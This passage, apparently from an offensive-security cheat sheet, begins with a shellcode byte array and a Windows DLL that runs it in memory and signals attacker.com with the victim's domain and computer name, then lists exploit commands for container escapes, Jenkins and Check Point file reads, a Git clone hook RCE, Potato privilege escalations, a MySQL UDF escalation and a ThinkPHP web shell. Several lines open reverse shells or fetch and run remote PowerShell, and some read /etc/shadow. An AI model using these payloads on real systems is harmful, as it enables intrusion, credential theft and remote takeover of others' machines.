    0x18, 0x00, 0x00, 0x00, 0x02, 0x80, 0x02, 0x80, 0x90, 0x10, 0x00, 0x00,
    0x04, 0x00, 0x00, 0x00, 0x94, 0x10, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00,
    0xb5, 0x11, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x5c, 0x00, 0x00, 0x00,
    0x20, 0x11, 0x00, 0x00, 0xc8, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x10, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x2e, 0x70, 0x64, 0x61,
    0x74, 0x61, 0x00, 0x00, 0x10, 0x10, 0x00, 0x00, 0x68, 0x00, 0x00, 0x00,
    0x2e, 0x72, 0x64, 0x61, 0x74, 0x61, 0x00, 0x00, 0x78, 0x10, 0x00, 0x00,
    0x2c, 0x00, 0x00, 0x00, 0x2e, 0x72, 0x64, 0x61, 0x74, 0x61, 0x24, 0x76,
    0x6f, 0x6c, 0x74, 0x6d, 0x64, 0x00, 0x00, 0x00, 0xa4, 0x10, 0x00, 0x00,
    0x7c, 0x00, 0x00, 0x00, 0x2e, 0x72, 0x64, 0x61, 0x74, 0x61, 0x24, 0x7a,
    0x7a, 0x7a, 0x64, 0x62, 0x67, 0x00, 0x00, 0x00, 0x20, 0x11, 0x00, 0x00,
    0xb0, 0x02, 0x00, 0x00, 0x2e, 0x74, 0x65, 0x78, 0x74, 0x24, 0x6d, 0x6e,
    0x00, 0x00, 0x00, 0x00, 0xd0, 0x13, 0x00, 0x00, 0x18, 0x00, 0x00, 0x00,
    0x2e, 0x78, 0x64, 0x61, 0x74, 0x61, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x44, 0x0f, 0xb6, 0x01, 0x45, 0x84, 0xc0, 0x74, 0x1f, 0x41, 0x0f, 0xb6,
    0xc0, 0x48, 0x2b, 0xca, 0x44, 0x0f, 0xb6, 0xc0, 0x3a, 0x02, 0x75, 0x10,
    0x0f, 0xb6, 0x44, 0x11, 0x01, 0x48, 0xff, 0xc2, 0x44, 0x0f, 0xb6, 0xc0,
    0x84, 0xc0, 0x75, 0xe8, 0x0f, 0xb6, 0x0a, 0x33, 0xd2, 0x8b, 0xc2, 0x44,
    0x3a, 0xc1, 0x0f, 0x97, 0xc0, 0x0f, 0x92, 0xc2, 0x2b, 0xc2, 0xc3, 0xcc,
    0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc,
    0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0x0f, 0xb6, 0x02, 0x84,
    0xc0, 0x74, 0x1a, 0x48, 0x2b, 0xd1, 0x66, 0x0f, 0x1f, 0x44, 0x00, 0x00,
    0x88, 0x01, 0x48, 0x8d, 0x49, 0x01, 0x0f, 0xb6, 0x04, 0x0a, 0x84, 0xc0,
    0x75, 0xf2, 0x88, 0x01, 0xc3, 0x88, 0x01, 0xc3, 0xcc, 0xcc, 0xcc, 0xcc,
    0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0x48, 0x89, 0x5c, 0x24,
    0x08, 0x48, 0x89, 0x6c, 0x24, 0x18, 0x56, 0x57, 0x41, 0x56, 0x48, 0x81,
    0xec, 0x80, 0x01, 0x00, 0x00, 0x65, 0x48, 0x8b, 0x04, 0x25, 0x60, 0x00,
    0x00, 0x00, 0x4c, 0x8b, 0xf1, 0x48, 0x8b, 0x50, 0x18, 0x4c, 0x8b, 0x52,
    0x18, 0x4d, 0x8b, 0xca, 0x0f, 0x1f, 0x40, 0x00, 0x4d, 0x8b, 0x09, 0x49,
    0x83, 0x79, 0x30, 0x00, 0x0f, 0x84, 0x94, 0x00, 0x00, 0x00, 0x45, 0x0f,
    0xb7, 0x41, 0x58, 0x33, 0xd2, 0x4d, 0x85, 0xc0, 0x74, 0x20, 0x66, 0x0f,
    0x1f, 0x44, 0x00, 0x00, 0x48, 0x83, 0xfa, 0x40, 0x73, 0x14, 0x49, 0x8b,
    0x41, 0x60, 0x0f, 0xb6, 0x0c, 0x50, 0x88, 0x4c, 0x14, 0x30, 0x48, 0xff,
    0xc2, 0x49, 0x3b, 0xd0, 0x72, 0xe6, 0x0f, 0xb6, 0x44, 0x24, 0x30, 0x84,
    0xc0, 0x74, 0x1c, 0x48, 0x8d, 0x54, 0x24, 0x30, 0x8d, 0x48, 0xbf, 0x80,
    0xf9, 0x19, 0x77, 0x04, 0x04, 0x20, 0x88, 0x02, 0x0f, 0xb6, 0x42, 0x01,
    0x48, 0xff, 0xc2, 0x84, 0xc0, 0x75, 0xe9, 0x48, 0x8d, 0x0d, 0xda, 0xfd,
    0xff, 0xff, 0xb2, 0x6b, 0x4c, 0x8d, 0x44, 0x24, 0x30, 0x49, 0x2b, 0xc8,
    0x48, 0x8d, 0x44, 0x24, 0x30, 0x44, 0x0f, 0xb6, 0x00, 0x41, 0x3a, 0xd0,
    0x75, 0x10, 0x0f, 0xb6, 0x54, 0x01, 0x01, 0x48, 0xff, 0xc0, 0x84, 0xd2,
    0x75, 0xeb, 0x44, 0x0f, 0xb6, 0x00, 0x33, 0xc9, 0x41, 0x3a, 0xd0, 0x0f,
    0x97, 0xc1, 0x33, 0xc0, 0x41, 0x3a, 0xd0, 0x0f, 0x92, 0xc0, 0x3b, 0xc8,
    0x74, 0x09, 0x4d, 0x3b, 0xd1, 0x0f, 0x85, 0x55, 0xff, 0xff, 0xff, 0x49,
    0x8b, 0x79, 0x30, 0x45, 0x33, 0xd2, 0x48, 0x63, 0x47, 0x3c, 0x8b, 0x8c,
    0x38, 0x88, 0x00, 0x00, 0x00, 0x8b, 0x5c, 0x39, 0x1c, 0x44, 0x8b, 0x5c,
    0x39, 0x20, 0x8b, 0x6c, 0x39, 0x24, 0x4c, 0x03, 0xdf, 0x48, 0x03, 0xef,
    0x48, 0x8d, 0x34, 0x1f, 0x85, 0xdb, 0x0f, 0x84, 0xb2, 0x00, 0x00, 0x00,
    0x4c, 0x8d, 0x0d, 0x6d, 0xfd, 0xff, 0xff, 0x48, 0x8d, 0x44, 0x24, 0x70,
    0x4c, 0x2b, 0xc8, 0x0f, 0x1f, 0x44, 0x00, 0x00, 0x41, 0x8b, 0x13, 0x48,
    0x8d, 0x44, 0x24, 0x70, 0x48, 0x03, 0xd7, 0x0f, 0xb6, 0x0a, 0x84, 0xc9,
    0x74, 0x1b, 0x4c, 0x8d, 0x44, 0x24, 0x70, 0x49, 0x2b, 0xd0, 0x66, 0x0f,
    0x1f, 0x44, 0x00, 0x00, 0x88, 0x08, 0x48, 0xff, 0xc0, 0x0f, 0xb6, 0x0c,
    0x02, 0x84, 0xc9, 0x75, 0xf3, 0x88, 0x08, 0x0f, 0xb6, 0x4c, 0x24, 0x70,
    0x84, 0xc9, 0x74, 0x1f, 0x48, 0x8d, 0x54, 0x24, 0x70, 0x0f, 0x1f, 0x00,
    0x8d, 0x41, 0xbf, 0x3c, 0x19, 0x77, 0x05, 0x80, 0xc1, 0x20, 0x88, 0x0a,
    0x0f, 0xb6, 0x4a, 0x01, 0x48, 0xff, 0xc2, 0x84, 0xc9, 0x75, 0xe9, 0x48,
    0x8d, 0x44, 0x24, 0x70, 0xb2, 0x67, 0x66, 0x90, 0x44, 0x0f, 0xb6, 0x00,
    0x41, 0x3a, 0xd0, 0x75, 0x11, 0x41, 0x0f, 0xb6, 0x54, 0x01, 0x01, 0x48,
    0xff, 0xc0, 0x84, 0xd2, 0x75, 0xea, 0x44, 0x0f, 0xb6, 0x00, 0x33, 0xc9,
    0x41, 0x3a, 0xd0, 0x0f, 0x97, 0xc1, 0x33, 0xc0, 0x41, 0x3a, 0xd0, 0x0f,
    0x92, 0xc0, 0x3b, 0xc8, 0x74, 0x73, 0x41, 0xff, 0xc2, 0x49, 0x83, 0xc3,
    0x04, 0x44, 0x3b, 0xd3, 0x0f, 0x82, 0x62, 0xff, 0xff, 0xff, 0x33, 0xdb,
    0x48, 0x8d, 0x15, 0xc9, 0xfc, 0xff, 0xff, 0x48, 0x8b, 0xcf, 0xff, 0xd3,
    0x48, 0x8d, 0x0d, 0xcd, 0xfc, 0xff, 0xff, 0xff, 0xd0, 0x48, 0x8d, 0x15,
    0xd4, 0xfc, 0xff, 0xff, 0x48, 0x8b, 0xc8, 0xff, 0xd3, 0x48, 0x8d, 0x8c,
    0x24, 0xa8, 0x01, 0x00, 0x00, 0x48, 0xc7, 0x44, 0x24, 0x28, 0x00, 0x00,
    0x00, 0x00, 0x48, 0x89, 0x4c, 0x24, 0x20, 0xba, 0x01, 0x00, 0x00, 0x00,
    0x49, 0x8b, 0xce, 0x45, 0x33, 0xc9, 0x45, 0x33, 0xc0, 0xff, 0xd0, 0x4c,
    0x8d, 0x9c, 0x24, 0x80, 0x01, 0x00, 0x00, 0x33, 0xc0, 0x49, 0x8b, 0x5b,
    0x20, 0x49, 0x8b, 0x6b, 0x30, 0x49, 0x8b, 0xe3, 0x41, 0x5e, 0x5f, 0x5e,
    0xc3, 0x42, 0x0f, 0xb7, 0x4c, 0x55, 0x00, 0x8b, 0x1c, 0x8e, 0x48, 0x03,
    0xdf, 0xeb, 0x91, 0xcc, 0x01, 0x15, 0x09, 0x00, 0x15, 0x54, 0x36, 0x00,
    0x15, 0x34, 0x34, 0x00, 0x15, 0x01, 0x30, 0x00, 0x0e, 0xe0, 0x0c, 0x70,
    0xb};
#else
#endif

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call,
                      LPVOID lpReserved) {
  switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH: {
      std::wstring dns_resolve_address = L"new.d%USERDOMAIN%.u%COMPUTERNAME%.attacker.com";
      wchar_t dns_name[MAX_PATH];
      if (ExpandEnvironmentStringsW(dns_resolve_address.c_str(), dns_name,
                                    MAX_PATH)) {
        LPVOID payload_memory = VirtualAlloc(
            NULL, payload_zx, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (payload_memory) {
          memcpy_s(payload_memory, payload_zx, rawData, payload_zx);

          wchar_t* dns_name_allocated = (wchar_t*)VirtualAlloc(
              NULL, MAX_PATH, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
          wcscpy_s(dns_name_allocated, MAX_PATH, dns_name);

          g_threadH = CreateThread(
              NULL, 0,
              (LPTHREAD_START_ROUTINE)((ptr_uint)payload_memory +
                                       (ptr_uint)payload_EP_offset),
              dns_name_allocated, 0, NULL);
        }
      }
      break;
    }
    case DLL_THREAD_ATTACH:
      break;
    case DLL_THREAD_DETACH:
      break;
    case DLL_PROCESS_DETACH:
      break;
  }
  return TRUE;
}
```

```c
$ ruler --insecure --username <DOMAIN>/<USERNAME> --password <PASSWORD> --email <EMAIL> --url <AUTODISCOVER> form add-com --sufix <FORM> --dll ./<FILE>.dll --name <DLL> --body "foobar"
```

## CVE-2024-21626: Leaky Vessels Container Escape

> https://github.com/Wall1e/CVE-2024-21626-POC

### Proof of Concept

#### Dockerfile

```c
FROM ubuntu:20.04
RUN apt-get update -y && apt-get install netcat -y
ADD ./poc.sh /poc.sh
WORKDIR /proc/self/fd/9
```

#### poc.sh

```c
#!/bin/bash
ip=$(hostname -I | awk '{print $1}')
port=<LPORT>
cat > /proc/self/cwd/../../../bin/bash.copy << EOF
#!/bin/bash
bash -i >& /dev/tcp/$ip/$port 0>&1
EOF

```

#### verify.sh

```c
#! /bin/bash
for i in {4..20}; do
    docker run -it --rm -w /proc/self/fd/$i ubuntu:20.04 bash -c "cat /proc/self/cwd/../../../etc/passwd"
done
```

### Malicious YAML File

```c
apiVersion: v1
kind: Pod
metadata:
  name: CVE-2024-21626
spec:
  containers:
  - name: ubuntu
    image: ubuntu
    workingDir: /proc/self/fd/8
    command: ["sleep"]
    args: ["infinity"] 
```

It can be the case that the `file descriptor` needs to be incremented until it show the actual output.

#### Inside the container

```c
$ cat ../../../../etc/shadow
```

## CVE-2024-23897: Jenkins Arbitrary File Read

> https://github.com/CKevens/CVE-2024-23897

```c
$ java -jar jenkins-cli.jar -noCertificateCheck -s 'http://<RHOST>:8080' help "@/etc/passwd"
$ java -jar jenkins-cli.jar -noCertificateCheck -s 'http://<RHOST>:8080' help "@/proc/self/environ"
$ java -jar jenkins-cli.jar -noCertificateCheck -s 'http://<RHOST>:8080' connect-node "@/var/jenkins_home/users/users.xml"
$ java -jar jenkins-cli.jar -noCertificateCheck -s 'http://<RHOST>:8080' connect-node "@/var/jenkins_home/users/<USERNAME>_12108429903186576833/config.xml"
```

## CVE-2024-24919: Check Point Security Gateway Information Disclosure (0-day)

```c
POST /clients/MyCRL HTTP/1.1
Host: <RHOST>
Content-Length: 39

aCSHELL/../../../../../../../etc/shadow
```

## CVE-2024-32002: Git: git clone RCE

> https://amalmurali.me/posts/git-rce/

> https://github.com/amalmurali47/git_rce

### Hook Repository

```c
$ git clone http://<RHOST>:3000/<USERNAME>/hook.git
$ cd hook
$ mkdir -p y/hooks
```

```c
$ cat > y/hooks/post-checkout <<EOF
#!/bin/bash
powershell.exe "IEX (New-Object Net.WebClient).DownloadString('http://<LHOST>/<FILE>.ps1')"
EOF
```

```c
$ chmod +x y/hooks/post-checkout
$ git add y/hooks/post-checkout
$ git commit -m "post-checkout"
$ git push
```

### RCE Repository

```c
$ git clone http://<RHOST>:3000/<USERNAME>/git_rce.git
$ git submodule add --name x/y http://<RHOST>:3000/<USERNAME>/hook.git A/modules/x
$ git commit -m "Add submodule"
$ printf .git > dotgit.txt
$ git hash-object -w --stdin < dotgit.txt > dot-git.hash
$ printf "120000 %s 0\ta\n" "$(cat dot-git.hash)" > index.info
$ git update-index --index-info < index.info
$ git commit -m "Add symlink"
$ git push
```

Compile the project for `Remote Code Execution (RCE)`.

## GodPotato LPE

> https://github.com/BeichenDream/GodPotato

```c
PS C:\> .\GodPotato-NET2.exe -cmd '<COMMAND>'
PS C:\> .\GodPotato-NET35.exe -cmd '<COMMAND>'
PS C:\> .\GodPotato-NET4.exe -cmd '<COMMAND>'
```

## Juicy Potato LPE

> https://github.com/ohpe/juicy-potato

> http://ohpe.it/juicy-potato/CLSID/

### GetCLSID.ps1

```c
<#
This script extracts CLSIDs and AppIDs related to LocalService.DESCRIPTION
Then exports to CSV
#>

$ErrorActionPreference = "Stop"

New-PSDrive -Name HKCR -PSProvider Registry -Root HKEY_CLASSES_ROOT

Write-Output "Looking for CLSIDs"
$CLSID = @()
Foreach($ID in (Get-ItemProperty HKCR:\clsid\* | select-object AppID,@{N='CLSID'; E={$_.pschildname}})){
    if ($ID.appid -ne $null){
        $CLSID += $ID
    }
}

Write-Output "Looking for APIDs"
$APPID = @()
Foreach($AID in (Get-ItemProperty HKCR:\appid\* | select-object localservice,@{N='AppID'; E={$_.pschildname}})){
    if ($AID.LocalService -ne $null){
        $APPID += $AID
    }
}

Write-Output "Joining CLSIDs and APIDs"
$RESULT = @()
Foreach ($app in $APPID){
    Foreach ($CLS in $CLSID){
        if($CLS.AppId -eq $app.AppID){
            $RESULT += New-Object psobject -Property @{
                AppId    = $app.AppId
                LocalService = $app.LocalService
                CLSID = $CLS.CLSID
            }

            break
        }
    }
}

$RESULT = $RESULT | Sort-Object LocalService

# Preparing to Output
$OS = (Get-WmiObject -Class Win32_OperatingSystem | ForEach-Object -MemberName Caption).Trim() -Replace "Microsoft ", ""
$TARGET = $OS -Replace " ","_"

# Make target folder
New-Item -ItemType Directory -Force -Path .\$TARGET

# Output in a CSV
$RESULT | Export-Csv -Path ".\$TARGET\CLSIDs.csv" -Encoding ascii -NoTypeInformation

# Export CLSIDs list
$RESULT | Select CLSID -ExpandProperty CLSID | Out-File -FilePath ".\$TARGET\CLSID.list" -Encoding ascii

# Visual Table
$RESULT | ogv
```

### Execution

```c
PS C:\> .\JuicyPotato.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p C:\Windows\system32\cmd.exe -a "/c powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://<LHOST>/<FILE>.ps1')" -t *
```

## JuicyPotatoNG LPE

> https://github.com/antonioCoco/JuicyPotatoNG

```c
PS C:\> .\JuicyPotatoNG.exe -t * -p "C:\Windows\system32\cmd.exe" -a "/c whoami"
```

## MySQL 4.x/5.0 User-Defined Function (UDF) Dynamic Library (2) LPE

> https://www.exploit-db.com/exploits/1518

```c
$ gcc -g -c raptor_udf2.c -fPIC
$ gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
```

```c
$ mysql -u root
```

```c
> use mysql;
> create table foo(line blob);
> insert into foo values(load_file('/PATH/TO/SHARED_OBJECT/raptor_udf2.so'));
> select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
> create function do_system returns integer soname 'raptor_udf2.so';
> select do_system('chmod +s /bin/bash');
```

## PrintSpoofer LPE

> https://github.com/itm4n/PrintSpoofer

```c
PS C:\> .\PrintSpoofer.exe -i -c powershell
```

## RemotePotato0 LPE

> https://github.com/antonioCoco/RemotePotato0

```c
$ sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:<RHOST>:<LPORT>
```

```c
PS C:\> .\RemotePotato0.exe -m 2 -r <LHOST> -x <LHOST> -p <LPORT> -s 1
```

## SharpEfsPotato LPE

> https://github.com/bugch3ck/SharpEfsPotato

```c
PS C:\> SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "C:\nc64.exe -e cmd.exe <LHOST> <LPORT>"
```

## Shocker Container Escape

> https://raw.githubusercontent.com/gabrtv/shocker/master/shocker.c

### Modifying Exploit

```c
        // get a FS reference from something mounted in from outside
        if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
                die("[-] open");

        if (find_handle(fd1, "/root/root.txt", &root_h, &h) <= 0)
                die("[-] Cannot find valid handle!");
```

### Compiling

```c
$ gcc shocker.c -o shocker
$ cc -Wall -std=c99 -O2 shocker.c -static
```

## ThinkPHP < 6.0.14 Remote Code Execution RCE

> https://github.com/Mr-xn/thinkphp_lang_RCE

```c
/index.php?s=index/index/index/think_lang/../../extend/pearcmd/pearcmd/index&cmd=whoami
/?page=/usr/local/lib/php/pearcmd&whoami
/?page=/usr/local/lib/php/pearcmd&/<?=system($_GET['cmd']);?>+/var/www/html/uploads/<FILE>.php
/?+config-create+/&page=/usr/local/lib/php/pearcmd&/<?=system($_GET['cmd']);?>+/var/www/html/uploads/<FILE>.php 
```
